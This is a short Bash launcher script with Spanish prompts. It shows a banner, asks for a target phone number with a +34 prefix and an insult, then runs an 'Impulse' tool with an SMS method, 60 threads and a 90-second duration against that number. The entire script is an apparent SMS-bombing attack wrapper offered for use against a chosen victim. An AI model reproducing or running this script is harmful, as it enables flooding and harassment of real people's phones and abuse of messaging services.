#!/bin/bash
#
# Prueba Xemon777 
#
# 

function CelBoom {
	sleep 0.5
	clear
echo -e " 
##     ## ######## ##     ##  #######  ##    ## ######## ######## ######## 
 ##   ##  ##       ###   ### ##     ## ###   ## ##    ## ##    ## ##    ## 
  ## ##   ##       #### #### ##     ## ####  ##     ##       ##       ##   
   ###    ######   ## ### ## ##     ## ## ## ##    ##       ##       ##    
  ## ##   ##       ##     ## ##     ## ##  ####   ##       ##       ##     
 ##   ##  ##       ##     ## ##     ## ##   ###   ##       ##       ##     
##     ## ######## ##     ##  #######  ##    ##   ##       ##       ##  
"

}

function PHONE {
echo -e -n "\e[36m
┌─┬┬┬┬──┬─┬┬┬─┐
│││││││││┴┤┌┤┼│
└┴─┴─┴┴┴┴─┴┘└─┘

Añadir +34 cabrones..
\e[35m════\e[32m>>\e[0m"
read -r phone
}
#
# CÓDIGO
#
CelBoom
PHONE
cd
cd Impulse
python impulse.py --method SMS --time 90 --threads 60 --target ${phone}
